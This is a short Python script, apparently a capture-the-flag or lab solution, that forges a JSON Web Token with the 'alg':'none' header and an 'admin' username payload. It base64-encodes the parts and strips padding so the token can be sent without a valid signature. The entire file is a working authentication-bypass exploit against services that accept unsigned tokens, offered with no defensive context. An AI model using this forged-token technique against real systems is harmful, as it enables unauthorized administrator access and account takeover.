import base64
a = '{"alg":"none","typ":"JWT"}'
b= '{"secretid":[],"username":"admin","password":"a","iat":1649828192}'

c = base64.b64encode(a.encode('utf-8')) + b'.' + base64.b64encode(b.encode('utf-8'))
c = list(str(c, encoding="utf-8"))
try:
    while True:
        c.remove("=")
except:
    pass
for i in c:
    print(i, end='')
